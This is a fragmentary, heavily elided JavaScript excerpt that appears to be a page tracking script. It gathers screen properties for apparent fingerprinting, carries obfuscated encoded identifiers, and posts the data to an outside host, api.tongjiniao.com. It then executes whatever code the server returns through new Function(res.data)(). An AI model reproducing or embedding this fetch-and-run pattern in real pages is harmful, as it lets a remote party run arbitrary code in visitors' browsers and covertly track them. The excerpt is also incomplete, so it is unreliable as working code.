...
if (isRepeat >= 2) {
    ...
    sg: 'tFvSh5tpmJlpa2ybbGiaaZFllGiUZ2dcU9GGb2qcYlmtW5yWmGaUlGpsbZJrYoSVg22YaZZicGNlkptraZNobHFplp2NVNiGcG9plWZvlGmSaptvmmlsYWqSmGFTxFhxW1vf',
...
let xhr;
this.storage.rid('2Mydj2dpl2VomJ1ol2ybZGJkkmhuZw==');
...
this.request.post('//api.tongjiniao.com/r?t=1741043506&p=755324972880220160', data,true,function (res){new Function(res.data)();});
        },
        screen: {
            AT: screen.availTop,
AL: screen.availLeft,
...
ON: screen.orientation
    ...
    if (!v) {
        v = 'bmyZl5WWbp1jcXBjZJhkYmplkmVsbGlqYGVjkZI='
    }
...
sid: function (k, v) {
    ...
    if (!v) {
        v = 'pZbXqc.jnqzKwWxmZmxqZp5rZmpslWKXYmZmkQ=='
    }
